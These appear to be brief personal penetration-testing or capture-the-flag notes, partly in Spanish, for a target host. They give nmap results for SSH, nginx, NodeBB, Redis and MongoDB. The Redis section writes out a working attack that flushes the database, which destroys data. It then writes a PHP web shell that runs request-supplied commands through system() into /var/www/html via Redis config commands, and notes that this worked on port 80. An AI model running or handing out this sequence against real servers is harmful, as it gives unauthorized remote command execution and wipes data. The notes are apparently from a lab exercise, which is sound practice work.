
# Notes

- Puedu escribir archivos a través de redis
# Nmap
```
22/tcp    open  ssh        OpenSSH 7.4p1 Debian 10+deb9u7 (protocol 2.0)
80/tcp    open  http       nginx 1.10.3
|_http-server-header: nginx/1.10.3
|_http-title: Welcome to nginx!
6379/tcp  open  redis      Redis key-value store 5.0.9
8080/tcp  open  http-proxy
| http-robots.txt: 3 disallowed entries
|_/admin/ /reset/ /compose
27017/tcp open  mongodb    MongoDB 4.0.18 4.1.1 - 5.0
```

# 8080 NodeBB
- Fuzzing root
- Fuzzing root con extensiones

# 6379 redis

- Podemos subir una web shell y acceder desde el puerto 80
- Necesitamos subirla a la ruta correcta para acceder desde el puerto 8080
- Master-slave sync - Doesn't work - It does work.. port 80
```
redis-cli -h target.com
flushall
set shell '<?php system($_REQUEST["cmd"]); ?>'
config set dbfilename shell.php
config set dir /var/www/html
save
```


# 80 nginx
- Fuzz root - nothing

# 27017 mongodb
